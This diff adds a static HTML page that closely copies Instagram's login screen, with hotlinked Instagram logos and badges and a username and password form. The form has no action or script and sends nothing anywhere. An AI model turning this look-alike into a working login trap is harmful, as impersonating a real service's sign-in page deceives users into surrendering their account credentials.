@@ -1,0 +1,153 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login Instagram</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            font-family: Arial, sans-serif;
+            background-color: #fafafa;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+        .container {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            width: 100%;
+            max-width: 935px;
+        }
+        .phone-image {
+            flex: 1;
+            background: url('https://www.instagram.com/static/images/homepage/home-phones.png/43cc71bb1b43.png') no-repeat center center;
+            background-size: cover;
+            height: 580px;
+            width: 454px;
+            margin-right: 32px;
+        }
+        .login-form {
+            width: 350px;
+            padding: 10px;
+            background-color: #fff;
+            border: 1px solid #dbdbdb;
+            text-align: center;
+            border-radius: 1px;
+        }
+        .login-form img {
+            margin: 36px auto 12px;
+            display: block;
+        }
+        .login-form input {
+            width: 100%;
+            padding: 10px;
+            margin: 6px 0;
+            border: 1px solid #dbdbdb;
+            border-radius: 3px;
+            background-color: #fafafa;
+        }
+        .login-form button {
+            width: 100%;
+            padding: 10px;
+            margin: 10px 0;
+            background-color: #3897f0;
+            border: none;
+            color: white;
+            font-weight: bold;
+            border-radius: 3px;
+            cursor: pointer;
+        }
+        .login-form .divider {
+            display: flex;
+            align-items: center;
+            text-align: center;
+            margin: 10px 0;
+        }
+        .login-form .divider::before,
+        .login-form .divider::after {
+            content: '';
+            flex: 1;
+            border-bottom: 1px solid #dbdbdb;
+        }
+        .login-form .divider::before {
+            margin-right: 10px;
+        }
+        .login-form .divider::after {
+            margin-left: 10px;
+        }
+        .login-form .or {
+            color: #8e8e8e;
+            font-weight: bold;
+            text-transform: uppercase;
+        }
+        .login-form .forgot {
+            display: block;
+            color: #00376b;
+            margin-top: 12px;
+            font-size: 12px;
+        }
+        .signup-section {
+            margin-top: 10px;
+            padding: 20px;
+            background-color: #fff;
+            border: 1px solid #dbdbdb;
+            text-align: center;
+        }
+        .signup-section p {
+            margin: 0;
+        }
+        .signup-section a {
+            color: #3897f0;
+            font-weight: bold;
+            text-decoration: none;
+        }
+        .app-section {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            margin-top: 20px;
+        }
+        .app-section p {
+            font-size: 14px;
+            margin-bottom: 10px;
+        }
+        .app-section img {
+            width: 136px;
+            margin: 5px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="phone-image"></div>
+        <div>
+            <div class="login-form">
+                <img src="https://www.instagram.com/static/images/web/mobile_nav_type_logo.png/735145cfe0a4.png" alt="Instagram Logo">
+                <form>
+                    <input type="text" placeholder="Phone number, username, or email" required>
+                    <input type="password" placeholder="Password" required>
+                    <button type="submit">Log In</button>
+                    <div class="divider">
+                        <span class="or">OR</span>
+                    </div>
+                    <a href="#" class="forgot">Forgot password?</a>
+                </form>
+            </div>
+            <div class="signup-section">
+                <p>Don't have an account? <a href="#">Sign up</a></p>
+            </div>
+            <div class="app-section">
+                <p>Get the app.</p>
+                <div>
+                    <img src="https://www.instagram.com/static/images/appstore-install-badges/badge_ios_english_en.png/4cd8a62d16f.png" alt="App Store">
+                    <img src="https://www.instagram.com/static/images/appstore-install-badges/badge_android_english_en.png/9c2a31c6e0f7.png" alt="Google Play">
+                </div>
+            </div>
+        </div>
+    </div>
+</body>
+</html>
